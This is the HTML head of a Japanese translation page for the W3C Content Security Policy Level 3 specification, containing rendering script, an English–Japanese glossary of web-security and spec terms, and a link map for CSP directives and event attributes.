<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8">
<title>Content Security Policy Level 3</title>

<link rel="stylesheet" href="common.css" type="text/css" />
<link rel="stylesheet" href="common-w3c.css" type="text/css" />
<script src="common0.js" ></script>
<script src="common1.js" async></script>

<!--%script -->
<script >
var source_data;

COMMON_DATA.page_state_key = 'webappsec';
COMMON_DATA.init = function(expanded){
	var options = {
		original_url: 'https://w3c.github.io/webappsec-csp/',
//		original_url: 'https://www.w3.org/TR/CSP3/',
		spec_status: 'ED',
		main: 'MAIN',
		fill_text_link: '#_versions > dd, #references dd',
		alt_refs: 'references',
		ref_id_prefix: 'biblio-',
		ref_id_lowercase: true,
	};

	if(expanded) return options;

	source_data = {
		html: E('MAIN').innerHTML,
		link_map: Util.getMapping('_link_map'),
		toc_main: 'MAIN0',
		levels: 'ほぼ英語:英語主体:英語+漢字:漢字主体:カナ主体',
		level: 3,
		generate: expand
	};
	Util.switchWordsInit(source_data);

//	Util.del_j(); //checked 160817 spec

	return options;
}

function expand(mapping1){
	var link_map = this.link_map;
	var idl_context = '';
	var nesting = '';
	var class_map = {
//		r: 'ref', // 参照文献
		p: 'production', // protocol element
		P: 'production', // protocol element
		dir: 'directive',
		h: 'header',
		e: 'element',
		a: 'attr',
		et: 'event-type',
		I: 'idl',
		m: 'idl',
		AO: 'abstract',
		E: 'error',
		sc: 'scheme',
		at: 'css',
		f: 'css',
//		fl: 'sandboxing',
		pl: 'literal',
	};
	var tag_map = {
		p: 'var',
		P: 'code',
		dir: 'code',
		h: 'code',
		css: 'code',
		sc: 'code',
		e: 'code',
		a: 'code',
		et: 'code',
		I: 'code',
		m: 'code',
		AO: 'span',
		E: 'code',
		at: 'code',
		f: 'code',
		v: 'var',
		c: 'code',
		s: 'samp',
		i: 'i',
		pl: 'code',
//		fl: 'code',
		NOTE: 'span'
	}

	E('MAIN').innerHTML = Util.replaceWords1(
		this.html.replace(
			/◎[^`<◎]*|⇒|【.*?】|%[\u4E00-\u9FFF~\w\-]+|`(.*?)([$@^])(\w*)/g,
			create_html
		),
		mapping1
	);

	function create_html(match, key, indicator, klass){

if(!indicator) {
	switch(match.charAt(0)){
	case '%':
		return '<var>' + match.slice(1) + '</var>'
	case '【':
		return '<span class="trans-note">' + match + '</span>'
	case '⇒':
		nesting += '</span>';
		return '：<span class="block">';
	}
	//◎
	var result = nesting + '<span lang="en">' + match.slice(1).trim() + '</span>';
	nesting = '';
	return result;
}


var text = key;
var href = '';
var classname = class_map[klass];
var tag = tag_map[klass];

switch(klass){
case '': // plain
	if(indicator === '^') return mapping1[key];// remap
	break;
case 'r': // 文献
	text = '[' + key + ']';
	href = '#biblio-' + key.toLowerCase();
	break;
case 'pl': //protocol literal
	text = '\'' + key + '\'';
	href = '#grammardef-' + key;
	break;
case 'p': // protocol 要素
	href = '#grammardef-' + key;
	break;
case 'dir': // 指令
	href = '#' + key;
	break;
case 'sc': // scheme
	text = key + ':';
	break;
case 'hex': // hex 
	text = '%x' + key;
	break;
case 'I': // idl def
	if( indicator === '@') {
		idl_context = '#dom-' + key + '-';
	}
	break;
case 'm': // idl member
	href = href || (idl_context + key).toLowerCase();
	break;
case 'l': //literal
	text = '"<code class="literal">' + key +'</code>"'
	break;
case 'lt': //protocol literal
	text = '"<code class="literal">' + text + '</code>"';
	break;
case 'IssW3C':
	return '<a href="https://github.com/w3c/html/issues/' + key + '">&lt;https://github.com/w3c/html/issues/' + key + '&gt;</a>';
	break;

case 'P': // protocol 要素
case 'd': // idl dict member
case 'sec': //節
case 'u': // 
case 'url': // 
case 'et': // 
case 'i': // 定数
case 'h': // HTTP header
case 'rq': // 要請
case 'rs': // 応答
case 'x': // plain
case 'vr': // 違反報告
case 'e': // HTML 要素
case 's': //samp
case 'c': //code
case 'v': // variables
case 'a': // HTML 内容属性
default:
	break;
}

if(tag) {
	text = '<' + tag +
		(classname ? ' class="' + classname + '">' : '>') +
		text + '</' + tag + '>';
}

if(indicator !== '^'){
	href = link_map[klass ? (klass + '.' + key) : key] || href;
	if(!href){
		console.log(match); // check error
		return match;
	}

	switch(indicator){
	case '$':
		text = '<a href="' + href + '">' + text + '</a>';
		break;
	case '@':
		text = '<dfn id="' + href.slice(1) + '">' + text + '</dfn>';
		break;
	}
}

return text;

	}
}
</script>


<!--%語彙 -->
<script type="text/plain" id="words_table">

	●network/HTTP/fetch
navigate::::ナビゲート
netowrk::::ネットワーク
HTTP-network:
HTTP:
Fetch:
URL:
	IP
	IPv4
	IPv6
cache::::キャッシュ
manifest::::マニフェスト
protocol::::プロトコル
url::::
fetch::::
	~fetch~~処理:fetching
port::::ポート
事前fetch:prefetch::事前 fetch
site::::サイト
website::::サイト
server::::サーバ
serve::::サービス供与
path::::パス
scheme::::スキーム
局所:local::~::ローカル
redirect::::リダイレクト
回数:count:~
	~redirect回数~redirect~count
referrer::::リファラ
client::::クライアント
address::::アドレス
国際化:internationalized:~
domain::::ドメイン
下位domain:subdomain:::下位ドメイン
field::::フィールド
header::::ヘッダ
host::::ホスト
hostname::::ホスト名
main:
message::::メッセージ
method::::メソッド
network::::ネットワーク
error::::エラー
web::::ウェブ
伝送-:transmit::~
受信-:receive::~
層:layer::~::レイヤ
接続-:connect::~::コネクト
接続:connection::~::コネクション
所在:location::~
応答:response::~::レスポンス
要請:request::~::リクエスト
要請前:pre-request::~::リクエスト前
要請後:post-request::~::リクエスト後
解決-:resolve:~
資格証:credentials::資格証明情報::クレデンシャル
起動元:initiator::~
起動-:initiate::~
資源:resource::~:リソース
送信-:send::~
送信:sending::~
送達-:deliver::~
送達:delivery::~
通知-:notify::~
通知:notification::~
配備-:deploy::~::デプロイ
	配備:deployment:~
配置-:place:~
状態0:status::状態°::ステータス
状態code:status code::状態°code:状態°コード:ステータスコード
状態:state:~
生成元:origin::~::オリジン
非同一生成元:cross-origin::~::クロスオリジン
本体:body:~:::ボディ
素片除外:exclude fragment:~
行先:destination::~
凍結済み:frozen:~
外向けの:outgoing:~
提出:submission::~

	●保安
XSS:cross-site scripting:XSS
dangling-markup:dangling markup:::マークアップぶら下げ
privacy::::プライバシー
保安:security::~:セキュリティ
保安的:secure::~:セキュア
保安上の:security::~:セキュリティ上の
	保安施策:security policy::~:セキュリティポリシー
非保安的:insecure::~:非セキュア
	保安的でない:insecure:~
保護-:protect:~
信用-:trust:~
安全:safe:~
攻撃:attack:~
攻撃者:attacker:~
敵対的:hostile:~
注入:injection:~
注入-:inject:~
暗号的:cryptographic::~
暗号用:cryptographic::~
脅威:threat:~
迂回-:bypass:~
軽減-:mitigate:~
防止-:prevent:~
中止-:abort:~
予測-:predict:~
悪用-:exploit:~
推測不能:unguessable:~
欠陥:flaw:~
	exfiltration:::
sink:
whitelist::::ホワイトリスト
双方向通信channel:bidirectional communication channel:双方向通信 channel::双方向通信チャンネル
監禁-:lock down:~
投入-:feed:~
	fed
検証0-:verify:検証
検証:validation:~
乱数生成器:random number generator:~
前線防御:first line of defense:~
多層防御:defense-in-depth:~
脆弱性:vulnerabilities:~

大規模な:extensive:~
	壊れ易く, 扱い難い:brittle, awkward
自信:confidence:~
	自信がない:low confidence
	自信がある:high degree of confidence
大変:tough:~
迂回:bypass:~
sniffing:
	持ち込む:bring する
	構文解析-時に挿入され:parser-inserted
完全性:integrity::~
特権:privilege:~
懸念-:concern:~

防御-:defend:~
緩い:lax な:~
騙せる:trick できる:~
漏洩:leakage:~
探査-:probe:~

全部的:full:~
敏感:sensitive::~
session::::セッション
識別子:identifier:~
log-in::::ログイン
盗用-:steal:~
盗用:stealing:~
転用-:repurpose:~
	Pixel Perfect
	誘う道:tempting avenues
	UI Redressing


	●CSP 対象
CSS:
	CSSOM
MIME:
compilation::::コンパイル
text::::テキスト
track::::トラック
inline::::インライン
navi:navigation:::ナビ
script::::スクリプト
style::::スタイル
stylesheet::::スタイルシート
sandbox::::サンドボックス
	~sandbox化:sandboxed
	~sandbox用:sandboxing
pop-up:pop-up
plugin::::プラグイン
bookmarklet::::ブックマークレット
onener:
realm:
環境:environment:~
音声:audio::~
動画:video::~
画像:image::~
宣言-:declare::~
宣言:declaration::~
規則:rule::~
選択子:selector::~::セレクタ
閲覧文脈:browsing context::~
作動中の:active な::~::アクティブな
	作動中:active:~
要素:element::~
文書:document::~
親:parent::~
先祖:ancestor::~
入子に:nest::入れ子に
入子の:nested::入れ子の
埋込んで:embed して::埋め込んで
埋込んだ:embed した::埋め込んだ
埋込む:embed する::埋め込む
埋込まれ:embed され::埋め込まれ
埋込める:embed できる::埋め込める
埋込み:embedding::埋め込み
	埋込-:embed:~
	読込-:load:~
読込み:loading::読み込み::ローディング
読込ませ:load させ::読み込ませ::ロードさせ
読込まれ:load され::読み込まれ::ロードされ
読込む:load する::読み込む::ロードする
読込める:load できる::読み込める::ロードできる
読込んで:load して::読み込んで::ロードして
読込もう:load しよう::読み込もう::ロードしよう
誘発-:trigger:~
能力:capabilities:~
開いた:open した::~
開く:open する::~
開かれ:open され::~
開けな:open できな::~

	●CSP
CSP:
	Content Security Policy
hash::::ハッシュ
nonce::::ナンス
nonceable::::ナンス可能
metadata::::メタデータ
source::::ソース
fall-back:fall back:::フォールバック
fallback::::フォールバック
digest::::ダイジェスト

処分先:disposition:~
施策:policy::~:ポリシー
式:expression::~
報告:report::~
報告処理:reporting::~
報告先:reporting endpoint::~
端点:endpoint::~::エンドポイント
施行-:enforce::~
施行:enforcement::~
	施行ing:enforcing:施行
監視-:monitor::~
監視:monitoring::~
検査:check::~::チェック

制御:control:~
制約-:restrict:~
制約:restriction:~
制限-:limit:~
被保護:protected:~
	被設定時:被 set 時:~
合格-:pass::~::パス

阻止-:block::~::ブロック
	阻止する:block する::阻む::ブロックする
	阻止され:block され::阻まれ::ブロックされ
	阻止でき:block でき::阻め::ブロックでき
阻止ed:Blocked::阻止される::ブロックされる
	阻止:blocking::~::ブロッキング


合致:match::~::マッチ
非合致:Does Not Match::合致しない::マッチしない
合致es:Matches::合致する::マッチする
照合:matching::~::マッチング
照合-:match::~::マッチ

許容-:allow:~
許容ed:Allowed::許容される

違反-:violate::~
違反:violation::~
違反ed:violated::違反
非違反:Does Not Violate::違反しない

先天的:a priori:~

指令:directive::~::ディレクティブ
発火-:fire::~
	発行-:make:~
大域:global::~::グローバル
稼働中の:running:~
	稼働-:run:~
処理命令:processing-instruction:~
通過制御-:gate:~

	●event／DOM／IDL
JS:JavaScript
IDL:
call:
callable:
target::::ターゲット
event::::イベント
handler::::ハンドラ
listener::::リスナ
instance::::インスタンス
task::::タスク
	instance化:instantiation
	instance化:instantiate:~
interface::::インタフェース
obj:object:::オブジェクト
trusted:
window:
worker:
prop:property:::プロパティ
node::::ノード
shadow:
light:
	light:main
配送-:dispatch::~
木:tree::~::ツリー
根:root::~::ルート
投出-:throw:~
浮上-:bubble::~
	通り抜けて:way out

	●未分類（動詞
lock::::ロック
	popping:
push::::プッシュ
scalable::::スケーラブル
	skip::::
sort::::ソート
	splitting::::
剥いだ:strip した:~
除外-:exclude:~
検知-:detect:~
不許可に:disallow:~
上書き:override:~
昇格:upgrade:~
文脈:context:~
抽出-:extract:~
拡充-:populate:~
抑制-:reduce:~
初期:initial:~
初期化-:initialize:~
	initializing:~
初期化:initialization:~
作成-:create:~
作成:creation:~
作成法:creating:~
動作-:act:~
動作:action:~
包含-:contain:~
収集-:collect:~
分割-:split:~
取得-:get:~
成功-:succeed:~
成功裡:successful:~
失敗-:fail:~
挿入-:insert:~
改変-:modify:~
格納-:store:~
構築-:construct:~
準備-:prepare:~
生成-:generate:~
除去-:remove:~
取扱い:handling:取り扱い
取扱う:handle する:取り扱う
取扱われ:handle され:取り扱われ
可能化-:enable:~
置換-:replace:~
表現-:represent:~
表現:representation:~
識別-:identify:~
評価-:evaluate:~
維持-:maintain:~
先行-:precede:~
完了-:complete:~
処理-:process:~
処理:processing:~
評価0:estimate:評価
追加-:add:~
	追加の:additional:~
命名-:name:~
呼出:invocation:呼び出し
在する:present する:在る
	在しな:present しな:無
	在する下:presence
組合せ:combination:~
	残りの:remaining:~
	渡す:pass する:~
設定-:set:~
設定子:setter::~
設定群:settings::~
生産-:produce:~
	~~源になる:produce:~
走らす:run する:走らせる
操作-:manipulate:~

	●未分類
ABNF:
HTML:
	Document
	JSON
	Level
	Main
	Service Worker
	XSLT
	base64

access::::アクセス
addon::::アドオン
alias::::エイリアス
bit::::ビット
code::::コード
block::::ブロック
browser::::ブラウザ
	abstract:
	case-sensitive:
束縛-:bind:~
flow::::フロー
	subject:::
厳密:strict:~

行番号:line number::~
列番号:column number::~
console::::コンソール
data::::データ
	decision:
	demonstrate::::
file::::ファイル
flag::::フラグ
font::::フォント
強制:forced::~
form::::フォーム
frame::::フレーム
group::::グループ
iframe::::
index::::
item::::アイテム
level::::レベル
list::::リスト
logic::::ロジック
mode::::モード
	open::::
	opener:
page::::ページ
pair::::ペア
	成分:part:~
percent::::パーセント
	~plugin-type:
random::::ランダム
	srcdoc::::
tag::::タグ

抽象演算:abstract operation:~
担当の:responsible:~
値:value:~
元の:original:~
出力:output:~
入力:input:~
	全体:entire:~
内容:content:~
内側:inside:内部
	再利用-:reuse:~
	から生じて:originate:~
効果:effect:~
動的:dynamic:~
参照:reference:~
名前:name:~
名:name:~
型:type::~
種別:type::~
基底:base:~
属性:attribute:~
引数:argument:~
	数:number:~
整数:integer:~
新たな:new:~
既定:default:~
既定の:default:~
更新:update:~
	最初の:first:~
有効な:effective:~
条件:condition:~
運用:operation:~
直接的:direct:~
相対的:relative:~
	簡単:straightforward:~
継承:inheritance:~
種類:kind:~
細かい:granular な:~
現在:currently:~
現在の:current:~
空:empty:~
自前の:own:~
	複数の:multiple:~
	量:amount:~
関連する:relevant な:~
	関連の
集合:set:~
非負:non-negative:~
単独の:single:~
既存の:existing:~

	●構文
Unicode:
ASCII:
	ASTERISK
	SEMICOLON
	SOLIDUS
	FULLSTOP
	COMMA
	STOP
space::::スペース
keyword::::キーワード
literal::::リテラル
構成子:constructs:~
構文:syntax:~
構文解析-:parse::~::パース
構文解析:parsing::~::パース処理
構文解析器:parser::~::パーサ
生成規則:production:~
復号-:decode::~::デコード
符号化-:encode::~::エンコード
符号化方式:encoding::~::エンコーディング
文字:character:~
文字列:string:~
大小無視:case-insensitive:~
小文字化:lowercase 化:~
文法:grammar:~
直列化:serialization::~::シリアル化
直列化-:serialize::~::シリアライズ
直列化器:serializer::~::シリアライザ
直列化形の:serialized::~::シリアライズされた

空白:whitespace:~
space::空白
空白並び:spaces:~
区切りの:-delimited:~
区切って:delimit して:~
asterisk::::アスタリスク
semicolon::::セミコロン
slash::::スラッシュ
period::::ピリオド
comma::::カンマ
token::::トークン

schedule::::スケジュール

	●仕様
API:
algo:algorithm:::アルゴリズム
	W3C
hook::::フック
bug::::バグ
noise::::ノイズ
support::::サポート
UA:user agent:UA
model::::モデル
risk::::リスク
tool::::ツール
UI::::
相互作用:interactions:~
形成-:form:~
選好-:prefer:~
概説-:outline:~
見なさ:consider さ:~
不可欠:critical:~
	取り扱う:deal with
公式的:formal:~
	課題:issue:::
	fashion:
基盤:infrastructure:~
安定的:stable:~
波及-:influence:~
	has no influence
module::::モジュール
modular::::モジュール式
vendor::::ベンダ
version::::バージョン
技術的には:technical には:形の上では
	~~公開の問い~open~questions:
	理にかなうreasonably:
	意義sense:
	素描するsketching:
	強くstrongly:
適切:appropriate:~
適合的:conformant:適合
適合性:conformance:~
適用-:apply:~
適用:application:~
避ける:avoid する:~
避けて:avoid して:~
期待-:expect:~
期待:expectations:~
一意な:unique:~
一意的:unique:~
一般:general:~
一般的:general:~
仕方:way:~
仕様:spec:~
仕組み:mechanism:~
任意の:arbitrary:~
作者:author:~
	例:example:~
	供-:provide:~
依存-:depend:~
保持-:hold:~
側面:aspect:~
	別個:distinct:~
	利用:use:~
判定基準:criteria:~
利用者:user:~:::ユーザ
	前者:former:~
取止める:drop する:取り止める
	古い:old:~
	基づく:based:~
変更点:changes:~
変更-:change:~
外部:external:~
外部化-:externalize:~
奨励-:encourage:~
妥当な:valid:~
妥当:valid:~
存在-:exist:~
定義-:define:~
定義:definition:~
実施:practice:~
実装-:implement:~
実装:implementation:~
実際:actual:~
将来:future:~
干渉-:interfere:~
序論:introduction:~
非推奨に:deprecate:~
非推奨:deprecated:~
強力:powerful:~
影響0:impact:影響
後方互換性:backwards-compatibility:~
後方互換:backwards compatible:~
恒久的:permanent:~
悪意的な:malicious:悪意のある
主体:party:~
情報:information:~
意味-:mean:~
意味:meaning:~
意味論的:semantic:~
意図的:intentional:~
意図-:intend:~
	~~意図:meant
手続き:steps:~
拡張:extension:~
	拡張性:extensibility:~
拡張-:extend:~
指定-:specify:~
挙動する:behave する:ふるまう
挙動:behavior:ふるまい
明確さ:clarity:~
明確:clear:~
明確化-:clarify:~
明示的:explicit:~
暗黙的:implicit:~
最善:best:~
実質的:effective:~
有意:significant:~
有用:useful:~
望む:wish する:~
段:step:~
正確:exact:~
本当に:really:~
概観:overview:~
標準:standard:~
機能性:functionality:~
欠く:lack する:~
求める:want する:~
決定-:determine:~
無傷で:unscathed:~
無視-:ignore:~
特定0の:particular:ある特定の
	個々の
特定の:specific:~
特有の:-specific:~
特色機能:feature:~
提供-:provide:~
提供0-:offer:提供
改善:improvement:~
実行-:execute:~
実行:execution:~
	-:perform
具現化-:render:~
枠組み:framework:~:::フレームワーク
理由:reason:~
用法:usage:~
用語:term:~
発展:evolution:~
目指す:aim する:~
目指して:aim して:~
目標:goal:~
相応しい:suitable な:~
確保-:ensure:~
	必ず
等価:equivalent:~
答え:answer:~
	節:section:~
築く:build する:~
築ける:build できる:~
築上げる:build up する:築き上げる
実験-:experiment:~
結付けら:associate さ:結び付けら
統合-:integrate:~
統合:integration:~
統治-:govern:~
補助-:help:~
要件:requirements:~
要求-:require:~
	見出-:find:~
規制-:regulate:~
規範的:normative:~
規約:convention:~
詳細:detail:~
詳細な:detailed:~
app:application:::アプリ
考慮点:consideration:~
調整-:adjust:~
論じら:discuss され:~
	討論:discussion:~
	謝辞:acknowledgement:~
警告:warning:~
登記簿:registry:::レジストリ
登録:registration:~
登録-:register:~
開発者:developer:~
関係:relation:~
関係する:related:~
	比してin relation to
需要:demand:~
	類似する:similar:~
	類似的:similar:~
駆動-:drive:~
	相応に:fairly:
待入する:queue する::待ち行列に入れる::キューする
含意:implications:~
著作上の:authoring:~
代用:replacement:~
信奉-:espouse:~
優先権:priority:~
	優先権を与える:advance the user’s priority
中核:core:~
	調節-:tweak:
反復的に:iterative fashion で:~
説明-:explain:~
単純:simple:~
手入力-:enter:~
特質:properties:~
疑義:suspect:~
所与の:given:与えられた
補佐的な:ancillary:~
勧める:suggest する:~
概念:concept:~
適度:reasonable:~
	策定-:land:~
状況:situations:~
旧来の:legacy:~
依拠-:rely:~
尊守-:honor:~
視野:scope:~
特別:special:~
先送り:defer:~
移譲-:delegate:~
正す:correct する:~
注意深い:careful な:~
care::::ケア
	正当:legitimate:~
	正当:right:~
	上手い:clever な:~
包括-:encompass:~
厳格:strict:~
不適正:improper:~
受容-:accept:~
設計:design:~
破棄-:discard:~
試みる:attempt する:~
高価:expensive:~
手段:means:~
保守-:maintain:~
依存関係:dependencies:~
事例:case:~
可能0:possible:可能
困難:difficult:~
能:ability:機能
自明:trivial:~
正しく:correct に:~
可視:visible:~

	●仕様（他
	担当する:responsible
	~~詳細は、~~自動的に:automagically
	存在下で:in the presence of
	悪くなる:worse
	まだ策定段階にある:work in progress
	明らかでない:not clear
	unclear
	substantial:::
	十分:sufficient:
	suspect
	〜に置き換えたもの~variant:
	その逆vice-versa:
	走査してwalking:
	~~注視-:watching:
	仕事~work:::
	委ねられる:devolves to
	好例:good examples
	~~正しく保つ:get right
	すてき:lovely
	拡げ:expand
	広範:wide:~
	反した:goes against
	例えば:for instance
	短く言えば:In short
	上手く:well
	価値が損われる:significantly reducing their value
	よって：:To that end
	整える:set up
	~~述べられ:spell out
	それ自身のために／に利するために:behalf of に
	従う-:adhere:~
	~~決定を下す:make decisions
	~~決定:decisions
	~~外:wild
	相当量:substantial amount
	相当に:pretty
	判断が付いた:gained confidence
	効果を~~発揮する:gains meaning
	土台:ground up
	いずれかに~~分類される:fall into one of several categories
	関わらず:regardless
	高次の:high-level
	緩め:loosen
	更なる:further
	書き直され:rewritten
	必要:need
	必要とされる:necessary
	同様に，:likewise
	今や:now
	今日:today
	何故なら:because
	~~働くserve
	~~置き換えて~substituteして
	関わる:interesting
	あたられるべき:ought to be consulted:
	~~意図:meant
	できるだけ抑え:try to minimize
	ぶん，:fairly
	おかげ:helpfully
	-:is reasonable
	諸刃の剣:big hammer
	まとまりのない:sprawlings
	調べて:examine
	部位:portion
	繰り返し:iteration
	自身:itself
	呼び出し元:caller
	外からの入力に対する注意深い検証／出力の安全な形への符号化-:careful input validation and output encoding
	~~渡し~~返す:handing the response back to
	代わりに:instead
	何らかの仕方でin one way or another
	例えば，:for-example
	依然として:still
	別の:another
	則って:according
	述-:describe
	次の:the following
	満たされ:met
	満たす:meet
	考-:think
	良い:good
	見よ:see
	~~述べられ:spelled out
	ある種の:certain
	おそらく:perhaps
	おそらく:probably
	あり得る／得る:potentially
	potential
	しかしながら:however
	preferably
	accordingly
	awesome

	●
	その一片:that bit
	~~尾部の:rightmost
	一部:part of
	両者:both
	各:each
	各種:various
	いくつかの:a number of
	この:this
	これらの:these
	すべての:all
	その:that
	それらの:those
	べき:should
	もっと良いbetter:
	より:more
	上:above
	与えて:giving:~
	二つの:two
	二番目の:second
	介:via
	他の:other
	他の場合:otherwise
	前:before
	同じ:same
	含-:include
	含めて:including
	多くの:many
	始-:begin
	対抗:against
	少数の:few
	弱:weak
	後:after
	後者:latter
	得る:obtain
	手渡す:hand
	新たに:newly
	異なる:different
	結果:result
	結果の:resulting
	返-:return
	長い:long
	note
	respective
	short
	time
	top
	true
	anyone
	anything
	back
	consist
	consisting
	count
	during
	e-mail:e-mail
	end
	everything
	fall
	~~最後のfinal
	gained
	get
	having
	叩く:hit
	in order to
	informative
	以上:least
	見当たらない:looked
	lot
	moreover
	moving
	nothing
	people
	片:piece
	public
	put
	neither
	ought
	please
	remain
	said
	seem
	sequence
	一連の:series of
	several
	something
	後続して:subsequent
	such
	themselves
	thing
	together
	we
	通じ:over
	~source:payload
	指す:pointing to
	重複:duplicate
	探し出-:looking for

</script>

<!--% 訳文 id → 原文 id -->
<script type="text/plain" id="_original_id_map">
ascii-case_insensitive:
style-src-init:
</script>

<!--%置換語 -->
<script type="text/plain" id="words_table1">
ES60:http://www.ecma-international.org/ecma-262/6.0/index.html
REPORTING:reporting1-ja.html
	https://w3c.github.io/reporting/
	https://mikewest.github.io/error-reporting/
SRI1:webappsec-subresource-integrity-ja.html

ACI:<a href="#ascii-case_insensitive" ><sub>大小無視</sub></a>

meta:<code class="element">meta</code> 
iframe-srcdoc:<code class="element">iframe</code> <code class="attr">srcdoc</code>

</script>

<!--%links -->

<script type="text/plain" id="_link_map">
	●grammardef
	pl.none:#grammardef-none
	pl.self:#grammardef-self
	pl.unsafe-eval:#grammardef-unsafe-eval
	pl.strict-dynamic:#grammardef-strict-dynamic
	pl.unsafe-inline:#grammardef-unsafe-inline
	p.ancestor-source-list:#grammardef-ancestor-source-list
	p.ancestor-source:#grammardef-ancestor-source
	p.base64-value:#grammardef-base64-value
	p.directive-name:#grammardef-directive-name
	p.directive-value:#grammardef-directive-value
	p.hash-algorithm:#grammardef-hash-algorithm
	p.hash-source:#grammardef-hash-source
	p.host-char:#grammardef-host-char
	p.host-part:#grammardef-host-part
	p.host-source:#grammardef-host-source
	p.keyword-source:#grammardef-keyword-source
	p.nonce-source:#grammardef-nonce-source
	p.path-part:#grammardef-path-part
	p.port-part:#grammardef-port-part
	p.scheme-part:#grammardef-scheme-part
	p.scheme-source:#grammardef-scheme-source
	p.serialized-directive:#grammardef-serialized-directive
	p.serialized-policy:#grammardef-serialized-policy
	p.serialized-source-list:#grammardef-serialized-source-list
	p.source-expression:#grammardef-source-expression

p.path-abempty:~IETF/rfc3986#section-3.3
p.scheme:~IETF/rfc3986#section-3.1
p.IPv4address:~IETF/rfc3986#section-3.2.2
p.uri-reference:~IETF/rfc3986#section-4.1
	~IETF/rfc5234#appendix-B.1
p.token:~IETF/rfc7230#section-3.2.6
	~IETF/rfc7230#section-3.2.3
p.type:~IETF/rfc2045#section-5.1
p.subtype:~IETF/rfc2045#section-5.1
P.ALPHA:#_ALPHA
P.DIGIT:#_DIGIT
P.VCHAR:#_VCHAR
P.OWS:#_OWS
P.RWS:#_RWS

~asterisk:#_asterisk
~semicolon:#_semicolon
~slash:#_slash
	COMMA:#_COMMA

	●dom
I.SecurityPolicyViolationEventDisposition:#enumdef-securitypolicyviolationeventdisposition
I.SecurityPolicyViolationEventInit:#dictdef-securitypolicyviolationeventinit
I.SecurityPolicyViolationEvent:#securitypolicyviolationevent
I.ServiceWorker:http://www.w3.org/TR/service-workers/#service-worker-interface
I.SharedWorker:~WORKERS#sharedworker
I.Worker:~WORKERS#worker
I.WorkerGlobalScope:~WORKERS#workerglobalscope
I.Window:~BROWSERS#window
I.WebSocket:~WEBSOCKET#websocket
I.EventSource:~HTML5/comms.html#eventsource
I.XMLHttpRequest:~XHR#xmlhttprequest

要素:~DOM4#concept-element
	I.Element:~DOM4#element
I.Event:~DOM4#event
I.EventInit:~DOM4#dictdef-eventinit
I.Document:~DOM4#document
文書:~DOM4#document

l.enforce:#dom-securitypolicyviolationeventdisposition-enforce
l.report:#dom-securitypolicyviolationeventdisposition-report

d.blockedURI:#dom-securitypolicyviolationeventinit-blockeduri
d.columnNumber:#dom-securitypolicyviolationeventinit-columnnumber
d.documentURI:#dom-securitypolicyviolationeventinit-documenturi
d.effectiveDirective:#dom-securitypolicyviolationeventinit-effectivedirective
d.lineNumber:#dom-securitypolicyviolationeventinit-linenumber
d.originalPolicy:#dom-securitypolicyviolationeventinit-originalpolicy
d.sourceFile:#dom-securitypolicyviolationeventinit-sourcefile
d.disposition:#dom-securitypolicyviolationeventinit-disposition
d.referrer:#dom-securitypolicyviolationeventinit-referrer
d.statusCode:#dom-securitypolicyviolationeventinit-statuscode
d.violatedDirective:#dom-securitypolicyviolationeventinit-violateddirective

m.Constructor:#dom-securitypolicyviolationevent-securitypolicyviolationevent
m.blockedURI:#dom-securitypolicyviolationevent-blockeduri
m.columnNumber:#dom-securitypolicyviolationevent-columnnumber
m.documentURI:#dom-securitypolicyviolationevent-documenturi
m.effectiveDirective:#dom-securitypolicyviolationevent-effectivedirective
m.lineNumber:#dom-securitypolicyviolationevent-linenumber
m.originalPolicy:#dom-securitypolicyviolationevent-originalpolicy
m.sourceFile:#dom-securitypolicyviolationevent-sourcefile
m.disposition:#dom-securitypolicyviolationevent-disposition
m.referrer:#dom-securitypolicyviolationevent-referrer
m.statusCode:#dom-securitypolicyviolationevent-statuscode
m.violatedDirective:#dom-securitypolicyviolationevent-violateddirective

	m.referrer:~HTMLdom#dom-document-referrer
m.text:~HEscripting#dom-script-text
m.textContent:~DOM4#dom-node-textcontent
m.bubbles:~DOM4#dom-event-bubbles
m.composed:~DOM4#dom-event-composed
m.target:~DOM4#dom-event-target
m.setInterval():~HTMLGAPI#dom-setinterval
m.setTimeout():~HTMLGAPI#dom-settimeout
m.document:~BROWSERS#dom-document-2
m.fetch():~FETCH#fetch-method
m.ping:~HEtextlevel#dom-a-ping


	m.cssText
	m.insertRule()

	v.type:#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type
	v.eventInitDict:#dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict

et.securitypolicyviolation:#_event-type-securitypolicyviolation

	●dirctive
	dir.base-uri:#base-uri
	dir.child-src:#child-src
	dir.connect-src:#connect-src
	dir.default-src:#default-src
	dir.font-src:#font-src
	dir.form-action:#form-action
	dir.frame-ancestors:#frame-ancestors
	dir.img-src:#img-src
	dir.media-src:#media-src
	dir.object-src:#object-src
	dir.plugin-types:#plugin-types
	dir.report-uri:#report-uri
	dir.report-to:#report-to
	dir.sandbox:#sandbox
	dir.script-src:#script-src
	dir.style-src:#style-src
	dir.navigation-to:#navigation-to


	dir.block-all-mixed-content
	dir.base-uri
	dir.form-action
	dir.frame-ancestors
	dir.plugin-types
	dir.sandbox
	dir.upgrade-insecure-requests
	dir.disown-opener


	●attr／elem
a.content:~HEmetadata#attr-meta-content
a.data:~HTMLemb#attr-object-data
a.href:~HEmetadata#attr-base-href
a.http-equiv:~HEmetadata#attr-meta-http-equiv
a.nonce:~HEscripting#attr-script-nonce
a.sandbox:~HTMLemb#attr-iframe-sandbox
a.type:~HTMLemb#attr-embed-type

e.a:~HEtextlevel#the-a-element
e.applet:~HTML5/obsolete.html#the-applet-element
e.base:~HEmetadata#the-base-element
e.embed:~HTMLemb#the-embed-element
e.form:~HEforms#the-form-element
e.iframe:~HTMLemb#the-iframe-element
e.link:~HEmetadata#the-link-element
e.meta:~HEmetadata#the-meta-element
	#meta
e.object:~HTMLemb#the-object-element
e.script:~HEscripting#the-script-element
	#script
e.style:~HEmetadata#the-style-element
e.frame:~HTML5/obsolete.html#frame

	●header
h.Content-Security-Policy:#header-content-security-policy
h.Content-Security-Policy-Report-Only:#header-content-security-policy-report-only
h.Link:~IETF/rfc5988#section-5

l.parser-inserted:~HEscripting#parser-inserted


	●

	~CSP:#content-security-policy
~CSP~list:#global-object-csp-list
~fetch指令:#fetch-directives

処分先:#policy-disposition
違反~報告:#violation-report
vr.~referrer:#violation-referrer
vr.~source~file:#violation-source-file
vr.~url:#violation-url
vr.大域~obj:#violation-global-object
vr.施策:#violation-policy
vr.有効な指令:#violation-effective-directive
vr.処分先:#violation-disposition
